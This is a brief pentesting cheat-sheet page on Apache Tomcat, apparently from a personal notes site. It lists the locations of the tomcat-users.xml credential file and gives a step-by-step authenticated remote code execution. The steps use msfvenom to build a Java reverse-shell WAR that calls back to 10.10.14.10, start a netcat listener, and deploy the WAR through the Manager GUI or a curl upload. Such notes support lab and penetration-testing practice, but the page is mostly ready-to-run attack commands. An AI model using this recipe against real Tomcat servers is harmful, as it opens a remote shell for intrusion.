---
title: "Apache Tomcat"
date: 2024-7-2
tags: ["tomcat", "apache", "web server", "war", "java", "rce"]
---

---
### Config Location

<div>

```bash
/usr/share/tomcat9/etc/tomcat-users.xml
```

```bash
/etc/tomcat9/tomcat-users.xml
```

</div>

<br>

---

### RCE (Authenicated)

#### 1. Create a WAR file

<div>

```bash
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war
```

</div>

#### 2. Start a listener

<div>

```bash
rlwrap nc -lvnp 1337
```

</div>

{{< tab set1 tab1 active >}}3a. Manager GUI{{< /tab >}}
{{< tab set1 tab2 >}}3b. Manager Script{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
+--------------------------------------------+
| Exploit                                    |
+--------------------------------------------+
| 1. Login to Tomcat Web Application Manager |
| 2. WAR file to deploy -> Deploy            |
| 3. Click /revshell in Applications table   |
+--------------------------------------------+
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```bash
curl -u '<USERNAME>:<PASSWORD>' http://example.com:8080/manager/text/deploy?path=/revshell --upload-file revshell.war
```

```bash
curl -s http://example.com:8080/revshell
```

</div>

{{< /tabcontent >}}

<br>
